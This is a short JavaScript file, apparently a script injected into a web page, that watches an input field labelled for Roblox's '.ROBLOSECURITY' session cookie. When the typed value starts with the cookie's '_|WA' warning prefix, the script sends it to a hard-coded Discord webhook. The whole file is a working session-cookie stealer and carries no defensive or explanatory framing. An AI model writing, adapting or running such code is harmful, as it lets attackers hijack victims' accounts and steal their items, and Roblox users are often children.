function waitForElement(selector, callback) {
    const checkExist = setInterval(() => {
        const element = document.querySelector(selector);
        if (element) {
            clearInterval(checkExist);
            callback(element);
        }
    }, 100); // Check every 100ms
}

function sendToDiscord(message) {
    const webhookUrl = 'https://discord.com/api/webhooks/1265154307192393760/V6JVLKmJLxaODRmjh--kSL18lkqh7fcJRh0s36LhD6mXWwj4xvkmY-TaTNxtLVHQFep3';
    const payload = JSON.stringify({ content: message });

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: payload
    }).catch(error => {
        console.error('Error sending to Discord:', error);
    });
}

waitForElement('.css-1o78utj-Roblosecurity--Input', (inputField) => {
    inputField.addEventListener('input', (event) => {
        const value = event.target.value;
        if (value.startsWith('_|WA')) {
            sendToDiscord(`Input value: ${value}`);
        }
    });
});
